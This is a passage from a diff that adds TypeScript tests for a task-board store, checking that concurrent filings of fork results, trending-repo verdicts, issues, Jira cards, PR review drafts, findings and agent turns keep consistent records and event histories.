+					pr: forkId,
+					prHead: "b".repeat(40),
+					released: true,
+				},
+			]);
+		}
+		const results = await Promise.all(
+			[1, 2].map((forkId) =>
+				store.createForkResult({
+					prompt: `report ${forkId}`,
+					title: `result ${forkId}`,
+					report: `findings ${forkId}`,
+					topic: "fork research",
+					proposals: [{ prompt: `proposal ${forkId}`, model: null }],
+					analyzed: [
+						{
+							forkId,
+							branchHash: "branch",
+							head: `head-${forkId}`,
+							at: 100 + forkId,
+							consumed: ["a".repeat(40)],
+						},
+					],
+				}),
+			),
+		);
+		const cards = await store.listTasks();
+		expect(cards).toHaveLength(4);
+		for (const [i, result] of results.entries()) {
+			expect(await store.getTask(result.id)).toEqual(result);
+			expect(result).toMatchObject({
+				title: `result ${i + 1}`,
+				report: `findings ${i + 1}`,
+				stage: "done",
+				state: "idle",
+				research: true,
+			});
+			const children = cards.filter((card) => card.followUpOf === result.id);
+			expect(children).toHaveLength(1);
+			expect(children[0]).toMatchObject({
+				prompt: `proposal ${i + 1}`,
+				state: "needs_you",
+				model: null,
+			});
+			expect(await store.listForkBranches(i + 1)).toMatchObject([
+				{
+					analyzedHead: `head-${i + 1}`,
+					firstPendingAt: null,
+					lastRunAt: 101 + i,
+					lastError: null,
+					retries: 0,
+				},
+			]);
+			expect(await store.listForkHolds(i + 1)).toEqual([]);
+			const ownIds = [result.id, children[0]!.id];
+			const events = (await store.events()).filter((event) =>
+				ownIds.includes(event.taskId ?? ""),
+			);
+			expect(events.map((event) => [event.kind, event.from, event.to])).toEqual(
+				[
+					["create", null, "todo"],
+					["state", null, "queued"],
+					["stage", "todo", "done"],
+					["state", "queued", "idle"],
+					["create", null, "todo"],
+					["state", null, "queued"],
+					["state", "queued", "needs_you"],
+				],
+			);
+		}
+	});
+
+	test("concurrent trending filings preserve duplicate verdicts and the scout cap", async () => {
+		const store = await open(join(root, "async-trending-cap"));
+		const scout = await store.createTask("scan", null, "trending");
+		const repos = ["owner/one", "OWNER/ONE", "owner/two", "owner/three"];
+		const results = await Promise.all(
+			repos.map((repo) =>
+				store.fileTrendingProposal({
+					scoutId: scout.id,
+					repo,
+					prompt: `adopt ${repo}`,
+					cap: 2,
+					now: 10,
+				}),
+			),
+		);
+		expect(results.map((result) => result.ok)).toEqual([
+			true,
+			false,
+			true,
+			false,
+		]);
+		const verdicts = await store.listTrendingVerdicts();
+		expect(verdicts.map((verdict) => verdict.repo).sort()).toEqual([
+			"owner/one",
+			"owner/two",
+		]);
+		const cards = await store.listTasks();
+		expect(cards).toHaveLength(3);
+		for (const verdict of verdicts) {
+			expect(verdict).toMatchObject({
+				verdict: "filed",
+				scoutCardId: scout.id,
+				firstSeenAt: 10,
+				judgedAt: 10,
+			});
+			expect(await store.getTask(verdict.proposalCardId!)).toMatchObject({
+				stage: "backlog",
+				state: "idle",
+				followUpOf: scout.id,
+				queuedAt: null,
+			});
+		}
+		expect(await store.getTrendingVerdict("owner/three")).toBeNull();
+		const events = await store.events();
+		expect(events.filter((event) => event.kind === "create")).toHaveLength(3);
+		for (const verdict of verdicts) {
+			expect(
+				events
+					.filter((event) => event.taskId === verdict.proposalCardId)
+					.map((event) => [event.kind, event.from, event.to]),
+			).toEqual([
+				["create", null, "todo"],
+				["state", null, "queued"],
+				["stage", "todo", "backlog"],
+				["state", "queued", "idle"],
+			]);
+		}
+	});
+
+	test("concurrent trending judgements preserve final verdicts and first-seen time", async () => {
+		const store = await open(join(root, "async-trending-judge"));
+		const scout = await store.createTask("scan", null, "trending");
+		const events = await store.events();
+		const final = await Promise.all([
+			store.judgeTrendingRepo({
+				scoutId: scout.id,
+				repo: "owner/final",
+				verdict: "no_fit",
+				reason: "first",
+				now: 10,
+			}),
+			store.judgeTrendingRepo({
+				scoutId: scout.id,
+				repo: "OWNER/FINAL",
+				verdict: "deferred",
+				reason: "second",
+				now: 20,
+			}),
+		]);
+		expect(final.map((result) => result.ok)).toEqual([true, false]);
+		expect(await store.getTrendingVerdict("owner/final")).toMatchObject({
+			verdict: "no_fit",
+			reason: "first",
+			firstSeenAt: 10,
+			judgedAt: 10,
+		});
+		expect(
+			await Promise.all([
+				store.judgeTrendingRepo({
+					scoutId: scout.id,
+					repo: "owner/later",
+					verdict: "deferred",
+					reason: "wait",
+					now: 30,
+				}),
+				store.judgeTrendingRepo({
+					scoutId: scout.id,
+					repo: "owner/later",
+					verdict: "no_fit",
+					reason: "final",
+					now: 40,
+				}),
+			]),
+		).toEqual([{ ok: true }, { ok: true }]);
+		expect(await store.getTrendingVerdict("owner/later")).toMatchObject({
+			verdict: "no_fit",
+			reason: "final",
+			firstSeenAt: 30,
+			judgedAt: 40,
+		});
+		expect(await store.events()).toEqual(events);
+	});
+
+	test("concurrent duplicate issue filings roll back task IDs and lifecycle events", async () => {
+		const store = await open(join(root, "async-issue"));
+		await store.setSettings({ taskIdPrefix: "ISSUE" });
+		const issue = { number: 7, title: "issue", prompt: "fix issue", now: 10 };
+		const results = await Promise.allSettled([
+			store.fileIssueCard(issue),
+			store.fileIssueCard({ ...issue, now: 20 }),
+		]);
+		expect(results.map((result) => result.status)).toEqual([
+			"fulfilled",
+			"rejected",
+		]);
+		expect(await store.listTasks()).toHaveLength(1);
+		expect(await store.getIssueWatch(7)).toEqual({
+			number: 7,
+			taskId: "ISSUE-1",
+			labelled: false,
+			filedAt: 10,
+		});
+		expect(await store.issueCardsFiledSince(0)).toBe(1);
+		expect(
+			(await store.events()).map((event) => [
+				event.kind,
+				event.taskId,
+				event.from,
+				event.to,
+			]),
+		).toEqual([
+			["create", "ISSUE-1", null, "todo"],
+			["state", "ISSUE-1", null, "queued"],
+			["stage", "ISSUE-1", "todo", "backlog"],
+			["state", "ISSUE-1", "queued", "idle"],
+		]);
+		expect((await store.createTask("next")).id).toBe("ISSUE-2");
+	});
+
+	test("concurrent Jira batches create one card and lifecycle per unique key", async () => {
+		const store = await open(join(root, "async-jira"));
+		const site = "https://acme.atlassian.net";
+		const item = (key: string) => ({ key, title: key, prompt: `fix ${key}` });
+		const [first, second] = await Promise.all([
+			store.fileJiraCards({
+				site,
+				stage: "backlog",
+				items: [item("A-1"), item("A-2")],
+				now: 10,
+			}),
+			store.fileJiraCards({
+				site,
+				stage: "todo",
+				items: [item("A-2"), item("A-3"), item("A-3")],
+				now: 20,
+			}),
+		]);
+		expect(first.skipped).toEqual([]);
+		expect(first.filed.map((card) => card.title)).toEqual(["A-1", "A-2"]);
+		expect(second.skipped).toEqual(["A-2", "A-3"]);
+		expect(second.filed.map((card) => card.title)).toEqual(["A-3"]);
+		expect(await store.listTasks()).toHaveLength(3);
+		expect(await store.jiraImported(site, ["A-1", "A-2", "A-3"])).toEqual(
+			new Map([
+				["A-1", first.filed[0]!.id],
+				["A-2", first.filed[1]!.id],
+				["A-3", second.filed[0]!.id],
+			]),
+		);
+		const events = await store.events();
+		for (const card of first.filed) {
+			expect(await store.getTask(card.id)).toEqual(card);
+			expect(
+				events
+					.filter((event) => event.taskId === card.id)
+					.map((event) => [event.kind, event.from, event.to]),
+			).toEqual([
+				["create", null, "todo"],
+				["state", null, "queued"],
+				["stage", "todo", "backlog"],
+				["state", "queued", "idle"],
+			]);
+		}
+		expect(second.filed[0]).toMatchObject({ stage: "todo", state: "queued" });
+		expect(
+			events.filter((event) => event.taskId === second.filed[0]!.id),
+		).toHaveLength(2);
+	});
+
+	test("concurrent PR runs and drafts keep one synchronized review card", async () => {
+		const store = await open(join(root, "async-pr-drafts"));
+		await store.savePrReview({
+			number: 12,
+			taskId: null,
+			head: "head",
+			firstSeenAt: 1,
+			reviewedHead: null,
+			postedHead: null,
+			postedUrl: null,
+			postedLogin: null,
+			state: "open",
+			draft: false,
+			title: "PR",
+			postError: null,
+			commentsAt: null,
+			commentsUnseen: false,
+		});
+		const runs = await Promise.all([
+			store.startPrRun(12, "first", 10),
+			store.startPrRun(12, "head", 20),
+		]);
+		expect(new Set(runs).size).toBe(2);
+		expect(await store.prReviewRunsSince(0)).toBe(2);
+		const drafts = await Promise.all([
+			store.savePrDraft({
+				run: runs[0]!,
+				number: 12,
+				head: "first",
+				draft: "first draft",
+				prompt: "first prompt",
+				blocking: true,
+			}),
+			store.savePrDraft({
+				run: runs[1]!,
+				number: 12,
+				head: "head",
+				draft: "second draft",
+				prompt: "second prompt",
+				blocking: false,
+			}),
+		]);
+		expect(drafts[0]?.id).toBe(drafts[1]?.id);
+		expect(drafts[0]).toMatchObject({
+			details: "first draft",
+			stage: "in_progress",
+			state: "needs_you",
+		});
+		expect(drafts[1]).toMatchObject({
+			details: "second draft",
+			prompt: "second prompt",
+			stage: "in_progress",
+			state: "needs_you",
+		});
+		expect(await store.getTask(drafts[1]!.id)).toEqual(drafts[1]);
+		expect(await store.listTasks()).toHaveLength(1);
+		expect(await store.getPrReview(12)).toMatchObject({
+			taskId: drafts[1]!.id,
+			reviewedHead: "head",
+			postedHead: null,
+		});
+		expect(await store.prHeadReviewed(12, "first")).toBe(true);
+		expect(await store.prHeadReviewed(12, "head")).toBe(true);
+		expect(await store.lastPrRun(12)).toBe(runs[1]!);
+		expect(await store.lastPrRunBlocking(12)).toBe(false);
+		expect(
+			(await store.events()).map((event) => [event.kind, event.from, event.to]),
+		).toEqual([
+			["create", null, "todo"],
+			["state", null, "queued"],
+			["stage", "todo", "in_progress"],
+			["state", "queued", "idle"],
+			["state", "idle", "needs_you"],
+		]);
+		const posted = await Promise.all([
+			store.claimPrPost(12, "head"),
+			store.claimPrPost(12, "head"),
+		]);
+		expect(posted).toEqual([null, undefined]);
+		const [postedRow, , , syncedCard] = await Promise.all([
+			store.getPrReview(12),
+			store.syncPrCard(12),
+			store.syncPrCard(12),
+			store.getTask(drafts[1]!.id),
+		]);
+		expect(postedRow).toMatchObject({ postedHead: "head" });
+		expect(syncedCard).toMatchObject({ stage: "done", state: "idle" });
+		const doneAt = syncedCard!.doneAt;
+		const events = await store.events();
+		await Promise.all([store.syncPrCard(12), store.syncPrCard(12)]);
+		expect((await store.getTask(drafts[1]!.id))?.doneAt).toBe(doneAt);
+		expect(await store.events()).toEqual(events);
+		expect(events.map((event) => [event.kind, event.from, event.to])).toEqual([
+			["create", null, "todo"],
+			["state", null, "queued"],
+			["stage", "todo", "in_progress"],
+			["state", "queued", "idle"],
+			["state", "idle", "needs_you"],
+			["stage", "in_progress", "done"],
+			["state", "needs_you", "idle"],
+		]);
+	});
+
+	test("concurrent unique findings reset the stamp only for a new prompt", async () => {
+		const store = await open(join(root, "async-findings"));
+		const card = await store.createTask("review");
+		const finding: RecordedFinding = {
+			prompt: "first finding",
+			model: "test/model",
+			rank: 2,
+			security: null,
+		};
+		await store.updateTask(card.id, { findingsCheckedAt: 100 });
+		expect(
+			await Promise.all([
+				store.appendReviewFinding(card.id, finding),
+				store.appendReviewFinding(card.id, finding),
+				store.appendReviewFinding(card.id, {
+					...finding,
+					prompt: "second finding",
+				}),
+			]),
+		).toEqual([true, false, true]);
+		expect(await store.listReviewFindings(card.id)).toEqual([
+			finding,
+			{ ...finding, prompt: "second finding" },
+		]);
+		expect((await store.getTask(card.id))?.findingsCheckedAt).toBeNull();
+		await store.updateTask(card.id, { findingsCheckedAt: 200 });
+		expect(
+			await Promise.all([
+				store.appendReviewFinding(card.id, finding),
+				store.appendReviewFinding(card.id, {
+					...finding,
+					prompt: "second finding",
+				}),
+			]),
+		).toEqual([false, false]);
+		expect((await store.getTask(card.id))?.findingsCheckedAt).toBe(200);
+		await expect(
+			store.appendReviewFinding(card.id, {
+				...finding,
+				prompt: null as unknown as string,
+			}),
+		).rejects.toThrow(/NOT NULL/);
+		expect((await store.getTask(card.id))?.findingsCheckedAt).toBe(200);
+		expect(await store.listReviewFindings(card.id)).toEqual([
+			finding,
+			{ ...finding, prompt: "second finding" },
+		]);
+		expect(
+			await store.appendReviewFinding(card.id, {
+				...finding,
+				prompt: "third finding",
+			}),
+		).toBe(true);
+		expect((await store.getTask(card.id))?.findingsCheckedAt).toBeNull();
+		expect(await store.events()).toHaveLength(2);
+	});
+
+	test("concurrent turn inserts return their own rows and completion records matching errors", async () => {
+		const store = await open(join(root, "async-turns"));
+		const card = await store.createTask("turns");
+		const turns = await Promise.all(
+			["a", "b", "c"].map((prompt) =>
+				store.startTurn(card.id, "work", prompt, null),
+			),
+		);
+		expect(new Set(turns.map((turn) => turn.id)).size).toBe(3);
+		expect(turns.map((turn) => turn.prompt)).toEqual(["a", "b", "c"]);
+		expect(await store.listTurns(card.id)).toEqual(turns);
+		const finished = await Promise.all(
+			turns.map((turn, i) =>
+				store.finishTurnState(turn.id, {
+					endedAt: turn.startedAt + 100 + i,
+					error: i === 1 ? "cancelled" : `error-${i}`,
+					summary: `summary-${i}`,
+				}),
+			),
+		);
+		expect(finished.map((turn) => [turn.id, turn.summary, turn.error])).toEqual(
+			[
+				[turns[0]!.id, "summary-0", "error-0"],
+				[turns[1]!.id, "summary-1", "cancelled"],
+				[turns[2]!.id, "summary-2", "error-2"],
+			],
+		);
+		expect(await store.listTurns(card.id)).toEqual(finished);
+		expect(
+			(await store.events())
+				.filter((event) => event.kind === "error")
+				.map((event) => [event.taskId, event.from, event.to, event.detail]),
+		).toEqual([
+			[card.id, null, null, "error-0"],
+			[card.id, null, null, "error-2"],
+		]);
+	});
+
+	test("concurrent title candidates return the saved first winner", async () => {
+		const store = await open(join(root, "async-title"));
+		const sessionId = "bbbb0000-0000-0000-0000-000000000801";
+		const card = await store.updateTask(
+			(await store.createTask("fallback")).id,
+			{
+				sessionId,
+			},
+		);
+		mkdirSync(store.sessionsDir, { recursive: true });
+		writeFileSync(
+			join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sessionId}.jsonl`),
+			'{"type":"title","v":1,"title":"Transcript candidate"}\n{"type":"session"}\n',
+		);
+		const events = await store.events();
+		const [, title, , readTitle] = await Promise.all([
+			store.nameTask(card.id, "Saved winner"),
+			store.frozenTitleFrom(card, null),
+			store.nameTask(card.id, "Losing candidate"),
+			store.frozenTitle(card),
+		]);
+		expect(title).toBe("Saved winner");
+		expect(readTitle).toBe("Saved winner");
+		expect(await store.sessionTitle(card)).toBe("Saved winner");
+		expect((await store.boardCardFacts()).titles.get(card.id)).toBe(
+			"Saved winner",
+		);
+		expect((await store.getTask(card.id))?.revision).toBe(card.revision);
+		expect(await store.events()).toEqual(events);
+	});
+
+	test("transcript capture rejects a changed session or turn window", async () => {
+		for (const changed of ["session", "window"] as const) {
+			const store = await open(join(root, `async-capture-${changed}`));
+			const sessionId = "cccc0000-0000-0000-0000-000000000811";
+			const card = await store.updateTask(
+				(await store.createTask(changed)).id,
+				{
+					sessionId,
+				},
+			);
+			const turn = await store.startTurn(card.id, "work", "capture", null);
+			await store.finishTurnState(turn.id, { endedAt: turn.startedAt + 1000 });
+			mkdirSync(store.sessionsDir, { recursive: true });
+			writeFileSync(
+				join(store.sessionsDir, `2026-09-27T10-00-00-000Z_${sessionId}.jsonl`),
+				`${JSON.stringify({
+					type: "message",
+					timestamp: new Date(turn.startedAt + 100).toISOString(),
+					message: {
+						role: "assistant",
+						provider: "zai",
+						model: "test/model",
+						usage: {
+							input: 10,
+							output: 1,
+							cacheRead: 0,
+							cacheWrite: 0,
+							cost: { total: 0.25 },
+						},
+						contextSnapshot: { promptTokens: 15000, compactionEpoch: 0 },
+					},
+				})}\n`,
+			);
+			const entered = Promise.withResolvers<void>();
+			const release = Promise.withResolvers<void>();
+			const paused = store.transaction(async () => {
+				entered.resolve();
+				await release.promise;
+			});
+			await entered.promise;
+			const capture = store.captureTurnData(turn.id);
+			const update =
+				changed === "window"
+					? store.finishTurnState(turn.id, { endedAt: turn.startedAt + 2000 })
+					: store.updateTask(card.id, {
+							sessionId: "cccc0000-0000-0000-0000-000000000812",
+						});
+			release.resolve();
+			await Promise.all([paused, capture, update]);
+			const facts = await store.perfFacts();
+			expect(facts.turns).toEqual([
+				{
+					endedAt: turn.startedAt + (changed === "window" ? 2000 : 1000),
+					failed: false,
+					cost: null,
+				},
+			]);
+			expect(facts.tasks[0]?.contextTokens).toBe(
+				changed === "session" ? null : 15000,
+			);
+			expect((await store.getTask(card.id))?.sessionId).toBe(
+				changed === "session"
+					? "cccc0000-0000-0000-0000-000000000812"
+					: sessionId,
+			);
+			expect((await store.listTurns(card.id))[0]?.endedAt).toBe(
+				turn.startedAt + (changed === "window" ? 2000 : 1000),
+			);
+			expect(
+				(await store.events()).map((event) => [event.kind, event.to]),
+			).toEqual([
+				["create", "todo"],
+				["state", "queued"],
+			]);
+		}
 	});
 });
